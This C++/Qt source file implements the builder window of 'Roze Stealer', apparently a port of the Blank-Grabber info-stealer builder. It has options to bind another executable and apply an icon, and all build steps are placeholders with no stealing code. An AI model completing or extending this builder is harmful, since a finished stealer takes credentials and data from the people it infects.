
#include "Builder.h"
#include <QApplication>
#include <QScreen>
#include <QFileDialog>
#include <QStandardPaths>

namespace RozeStealer {

Builder::Builder(QWidget* parent) : QMainWindow(parent) {
    // Set window properties
    setWindowTitle("Roze Stealer [Builder]");
    setFixedSize(1250, 600);
    
    // Check if running as admin (in Windows)
    if (!Utility::isAdmin()) {
        QMessageBox::warning(this, "Warning", "This application should be run with administrator privileges for full functionality.");
    }
    
    // Check for updates
    if (Utility::checkForUpdates()) {
        QMessageBox::StandardButton reply = QMessageBox::question(this, "Update Checker", 
            "A new version of the application is available. It is recommended that you update it to the latest version.\n\n"
            "Do you want to update the app? (you would be directed to the official github repository)",
            QMessageBox::Yes | QMessageBox::No);
            
        if (reply == QMessageBox::Yes) {
            QDesktopServices::openUrl(QUrl("https://github.com/Blank-c/Blank-Grabber"));
            QApplication::quit();
        }
    }
    
    // Setup UI
    setupUi();
    
    // Check Python environment
    checkPythonEnvironment();
}

Builder::~Builder() {
    // Clean up resources
}

void Builder::setupUi() {
    // Create central widget
    centralWidget = new QWidget(this);
    setCentralWidget(centralWidget);
    
    // Create main layout
    mainLayout = new QVBoxLayout(centralWidget);
    centralWidget->setLayout(mainLayout);
    
    // Create title label
    QFont titleFont;
    titleFont.setPointSize(34);
    titleFont.setBold(true);
    
    titleLabel = new QLabel("Roze Stealer", this);
    titleLabel->setFont(titleFont);
    titleLabel->setStyleSheet("color: #2F58CD;");
    titleLabel->setAlignment(Qt::AlignCenter);
    mainLayout->addWidget(titleLabel);
    
    // Create builder options frame
    builderOptions = new BuilderOptionsFrame(this);
    mainLayout->addWidget(builderOptions);
    
    // Connect signals
    connect(builderOptions, &BuilderOptionsFrame::buildExecutable, this, &Builder::handleBuildExecutable);
    connect(builderOptions, &BuilderOptionsFrame::buildPythonFile, this, &Builder::handleBuildPythonFile);
    
    // Set layout spacing and margins
    mainLayout->setSpacing(10);
    mainLayout->setContentsMargins(10, 10, 10, 10);
    
    // Set dark theme
    qApp->setStyle("Fusion");
    QPalette darkPalette;
    darkPalette.setColor(QPalette::Window, QColor(53, 53, 53));
    darkPalette.setColor(QPalette::WindowText, Qt::white);
    darkPalette.setColor(QPalette::Base, QColor(25, 25, 25));
    darkPalette.setColor(QPalette::AlternateBase, QColor(53, 53, 53));
    darkPalette.setColor(QPalette::ToolTipBase, Qt::white);
    darkPalette.setColor(QPalette::ToolTipText, Qt::white);
    darkPalette.setColor(QPalette::Text, Qt::white);
    darkPalette.setColor(QPalette::Button, QColor(53, 53, 53));
    darkPalette.setColor(QPalette::ButtonText, Qt::white);
    darkPalette.setColor(QPalette::BrightText, Qt::red);
    darkPalette.setColor(QPalette::Link, QColor(42, 130, 218));
    darkPalette.setColor(QPalette::Highlight, QColor(42, 130, 218));
    darkPalette.setColor(QPalette::HighlightedText, Qt::black);
    qApp->setPalette(darkPalette);
}

void Builder::checkPythonEnvironment() {
    // In a real application, this would check Python version and dependencies
    // For now, it's a placeholder
}

void Builder::handleBuildExecutable(const QString& configData, const QByteArray& iconBytes, const QString& boundFilePath) {
    // Save config data to a temporary file
    QString configFilePath = QDir::tempPath() + "/config.json";
    QFile configFile(configFilePath);
    if (configFile.open(QIODevice::WriteOnly)) {
        configFile.write(configData.toUtf8());
        configFile.close();
    } else {
        QMessageBox::critical(this, "Error", "Failed to create temporary config file!");
        return;
    }
    
    // Save icon if provided
    QString iconFilePath;
    if (!iconBytes.isEmpty()) {
        iconFilePath = QDir::tempPath() + "/icon.ico";
        QFile iconFile(iconFilePath);
        if (iconFile.open(QIODevice::WriteOnly)) {
            iconFile.write(iconBytes);
            iconFile.close();
        } else {
            QMessageBox::critical(this, "Error", "Failed to create temporary icon file!");
            return;
        }
    }
    
    // Copy bound executable if provided
    QString boundFileCopyPath;
    if (!boundFilePath.isEmpty()) {
        boundFileCopyPath = QDir::tempPath() + "/bound.exe";
        QFile::copy(boundFilePath, boundFileCopyPath);
    }
    
    // In a real application, this would run the build process
    // For now, show a success message
    QMessageBox::information(this, "Build", "Executable build process would start here.\n\n"
                                          "In a real implementation, this would:\n"
                                          "1. Create a virtual environment\n"
                                          "2. Install dependencies\n"
                                          "3. Process the stub code\n"
                                          "4. Build the executable\n"
                                          "5. Apply icon and other settings");
}

void Builder::handleBuildPythonFile(const QString& configData) {
    // Ask for save location
    QString outPath = QFileDialog::getSaveFileName(this, "Save as", 
        QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation),
        "Python Script (*.py *.pyw)");
        
    if (outPath.isEmpty()) {
        return;
    }
    
    // In a real application, this would process the Python file
    // For now, create a dummy Python file
    QFile outFile(outPath);
    if (outFile.open(QIODevice::WriteOnly | QIODevice::Text)) {
        outFile.write("# This is a placeholder for the generated Python file\n");
        outFile.write("# In a real implementation, this would contain the processed stub code\n\n");
        outFile.write("print('Roze Stealer - Python Version')\n");
        outFile.close();
        
        QMessageBox::information(this, "Success", "File saved as " + outPath);
    } else {
        QMessageBox::critical(this, "Error", "Failed to save the file!");
    }
}

void Builder::runBuildProcess(const QStringList& args) {
    // In a real application, this would run a build process with the given arguments
    // For now, it's a placeholder
}

} // namespace RozeStealer

